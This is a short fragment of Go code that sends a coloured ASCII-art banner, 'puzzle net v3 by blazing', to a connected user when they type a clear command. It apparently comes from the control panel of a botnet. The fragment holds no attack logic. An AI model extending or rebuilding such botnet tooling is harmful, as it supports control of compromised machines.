        if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mpuzzled??? \033[01;37m" + username + " !          \r\n")))
            this.conn.Write([]byte("\033[37m      _      _      _      _      _      _      _      \r\n"))
            this.conn.Write([]byte("\033[37m    _( )__ _( )__ _( )__ _( )__ _( )__ _( )__ _( )__   \r\n"))
            this.conn.Write([]byte("\033[37m  _|     _|     _|     _|     _|     _|     _|     _|  \r\n"))
            this.conn.Write([]byte("\033[37m (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   \r\n"))
            this.conn.Write([]byte("\033[37m  |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m  |_     |_     |_     |_     |_     |_     |_     |_  \r\n"))
            this.conn.Write([]byte("\033[37m   _) _   _) _   _) _   _) _   _) _   _) _   _) _   _) \r\n"))
            this.conn.Write([]byte("\033[37m  |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m  _|     _|     _|     _|     _|     _|     _|     _|  \r\n"))
            this.conn.Write([]byte("\033[37m (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   \r\n"))
            this.conn.Write([]byte("\033[37m  |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m  |_     |_     |_     |_     |_     |_     |_     |_  \r\n"))
            this.conn.Write([]byte("\033[37m   _) _   _) _   _) _   _) _   _) _   _) _   _) _mx _) \r\n"))
            this.conn.Write([]byte("\033[37m  |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[01;31m                puzzle net v3 by blazing \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }   